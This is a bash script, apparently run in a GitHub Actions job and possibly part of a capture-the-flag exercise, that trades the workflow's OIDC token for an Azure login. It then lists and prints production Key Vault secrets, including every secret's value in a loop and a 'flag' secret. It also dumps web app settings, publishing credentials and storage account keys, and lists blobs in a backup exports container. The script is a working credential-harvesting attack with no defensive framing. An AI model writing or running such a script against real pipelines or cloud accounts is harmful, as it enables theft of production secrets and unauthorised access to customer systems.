#!/usr/bin/env bash
set -euo pipefail

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== LOGGED IN ==="
az account show --query user.name -o tsv 2>/dev/null || echo n/a

echo "=== KV PROD SECRET LIST ==="
az keyvault secret list --vault-name kv-tbl-prod-x3euoz -o json 2>&1 | jq -r '.[].id' || echo FAILED

echo "=== KV SEC SECRET LIST ==="
az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o json 2>&1 || echo FAILED

echo "=== KV PROD FLAG ==="
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name flag -o json 2>&1 || echo NOT_FOUND

echo "=== KV SEC FLAG ==="
az keyvault secret show --vault-name kv-tbl-sec-x3euoz --name flag -o json 2>&1 || echo NOT_FOUND

echo "=== STOREFRONT APPSETTINGS ==="
az webapp config appsettings list --name app-tbl-storefront-prod --resource-group rg-tbl-platform-prod-sea -o json 2>&1 || echo FAILED

echo "=== STOREFRONT PUBLISH CREDS ==="
az webapp deployment list-publishing-credentials --name app-tbl-storefront-prod --resource-group rg-tbl-platform-prod-sea -o json 2>&1 || echo FAILED

echo "=== APPCFG STORAGE KEYS ==="
az storage account keys list --account-name sttblappcfgprodx3euoz --resource-group rg-tbl-platform-prod-sea -o json 2>&1 || echo FAILED

echo "=== BACKUP STORAGE KEYS ==="
az storage account keys list --account-name sttblbackupprodx3euoz --resource-group rg-tbl-platform-prod-sea -o json 2>&1 || echo FAILED

echo "=== BACKUP EXPORTS BLOBS (if key works) ==="
BKEY=$(az storage account keys list --account-name sttblbackupprodx3euoz --resource-group rg-tbl-platform-prod-sea --query '[0].value' -o tsv 2>/dev/null || echo "")
if [ -n "$BKEY" ]; then
  az storage blob list --account-name sttblbackupprodx3euoz --container-name exports --account-key "$BKEY" -o json 2>&1 | jq -r '.[].name' || echo FAILED
fi

echo "=== ALL KV PROD SECRETS ==="
for secret in $(az keyvault secret list --vault-name kv-tbl-prod-x3euoz -o json 2>/dev/null | jq -r '.[].name' || echo ""); do
  echo "--- $secret ---"
  az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$secret" --query value -o tsv 2>&1
done

echo "DONE"
